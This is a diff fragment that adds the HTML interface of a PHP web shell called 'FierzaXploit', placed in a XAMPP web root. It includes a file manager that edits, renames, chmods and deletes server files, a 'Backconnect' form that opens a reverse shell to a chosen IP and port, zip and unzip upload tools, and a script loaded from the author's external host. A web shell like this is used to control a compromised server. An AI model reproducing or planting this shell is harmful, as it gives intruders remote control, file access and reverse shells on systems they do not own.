+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/v3.php&nama_file=v3.php' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/v3.php&nama_file=v3.php' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr><tr>
+                                <th scope="row"><div class="form-check">
+                                <input name='daftarku[]' value='web.config' class="form-check-input" type="checkbox" value="1" id="flexCheckIndeterminate">
+                                </div></th>
+                                <td><font size='5'><i class="bi bi-filetype-doc"></i></font></td>
+                                <td>
+                                <a class="path" nama='filenya' href="?path=C:/xampp/htdocs/testpriv.php&aksi=view&path_file=C:/xampp/htdocs/testpriv.php/web.config">web.config</a>
+                                </td>
+                                <td>1.17 KB</td>
+                                <td>26 May 2022 08:07:43</td>
+                                <td><font color="#2EFF00">-rw-rw-rw-</font></td>
+                                <td>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=edit&dirf=C:/xampp/htdocs/testpriv.php/web.config&nama_file=web.config' class="btn btn-outline-success" data-bs-toggle="tooltip" data-bs-placement="top" title="Edit File"><i class="bi bi-pencil-square"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=rename&dirf=C:/xampp/htdocs/testpriv.php/web.config&nama_file=web.config' class="btn btn-outline-warning" data-bs-toggle="tooltip" data-bs-placement="top" title="Rename File"><i class="bi bi-pencil"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=chmod&dirf=C:/xampp/htdocs/testpriv.php/web.config&nama_file=web.config' class="btn btn-outline-light"><i class="bi bi-cursor-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Chmod File"></i></a>
+                                    <a href='?path=C:/xampp/htdocs/testpriv.php&aksi=delete&dirf=C:/xampp/htdocs/testpriv.php/web.config&nama_file=web.config' class="btn btn-outline-danger"><i class="bi bi-trash-fill" data-bs-toggle="tooltip" data-bs-placement="top" title="Delete File"></i></a>
+                                </td>
+                            </tr>                </tbody>
+        </table>
+        <a href="#up"><i class="bi bi-chevron-up up-icon"></i></a>
+        </div>
+    </div>
+        <button type="submit" name="hf" class="btn btn-outline-light me-2"><i class="bi bi-trash-fill"></i> Hapus File</button>
+        <a href="javascript:pilihsemua()" class="btn btn-outline-light me-2"><i class="bi bi-clipboard2-check-fill"></i> Check</a>
+        <a class="btn btn-outline-light" href="javascript:bersihkan()"><i class="bi bi-clipboard2-x-fill"></i> Uncheck</a>
+    </form>
+        <div class="container-fluid mb-3">
+        <div class="row">
+            <div class="col-12 col-sm-6">
+                <div class="row">
+                    <div class="col-12">
+                        <h5 class="text-center text-white mt-4"><b>- <i class="bi bi-broadcast-pin"></i> Backconnect [ php ] -</b></h5>
+                        <form method="POST">
+                            <div class="mb-3">
+                                <label class="form-label text-white">IP Address :</label>
+                                <input type="text" class="form-control" name="ip" id="exampleFormControlInput1" placeholder="127.0.0.1">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label text-white">Port :</label>
+                                <input type="text" class="form-control" name="port" id="exampleFormControlInput1" placeholder="1337">
+                            </div>
+                            <center><button name="conn" type="submit" class="btn btn-outline-light w-50">Coonect Now</button></center>
+                        </form>
+                                            </div>
+                </div>
+            </div>
+            <div class="col-12 col-sm-6">
+                <div class="row">
+                    <div class="col-12">
+                        <h5 class="text-center text-white mt-5"><b>- <i class="bi bi-file-earmark-zip-fill"></i> Unzip File -</b></h5>
+                        <form method="POST" enctype="multipart/form-data">
+                            <div class="input-group ">
+                                <input type="file" class="form-control" name="fzip" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
+                                <button class="btn btn-outline-light" type="submit" name="unzip" id="inputGroupFileAddon04">Upload & Unzip</button>
+                            </div>
+                        </form>
+                                            </div>
+                    <div class="col-12">
+                        <h5 class="text-center text-white mt-3"><b>- <i class="bi bi-file-zip-fill"></i> Zip File -</b></h5>
+                        <form method="POST">
+                            <div class="input-group mb-3 mt-2">
+                                <span class="input-group-text" id="basic-addon1">Folder/File Name</span>
+                                <input type="text" name="NameFolder" class="form-control" placeholder="C:\xampp\htdocs\testpriv.php" aria-label="Username" aria-describedby="basic-addon1">
+                            </div>
+                            <div class="input-group mb-3 mt-2">
+                                <span class="input-group-text" id="basic-addon1"><i class="bi bi-folder2-open"></i></span>
+                                <input type="text" name="folder" class="form-control" placeholder="C:\xampp\htdocs\testpriv.php" aria-label="Username" aria-describedby="basic-addon1">
+                            </div>
+                            <button type="submit" name="ZipFile" class="btn btn-outline-light w-100">Zip Now</button>
+                        </form>
+                        <label class="text-white mt-2 fs-6"><b>* NOTICE :</b> Maaf Jika Tools Zip File Tidak Work Dengan Sempurna,<br>Karena Masih Tahap Pengembangan</label>
+                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- akhir list file/folder -->
+    <br>
+    <div data-aos="fade-up"
+     data-aos-anchor-placement="center-bottom" class="footer">
+        <center>
+            <font color='white' size='5'><a class='text-white text-decoration-none' href='https://fierzaeriez.github.io/'><i class="bi bi-github"></i></a> <i class="bi bi-facebook"></i> <i class="bi bi-instagram"></i></font><font color='white'><hr width='55%'></font><br><br><p class="info">Design & Developed By FierzaXploit <br> Copyright &copy; 2022</p>        </center>
+    </div>
+    </div>
+    </div>
+    <br>
+
+    <!-- Optional JavaScript; choose one of the two! -->
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+    <script src="https://fierzaeriez.github.io/check.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+</body>
+</html>
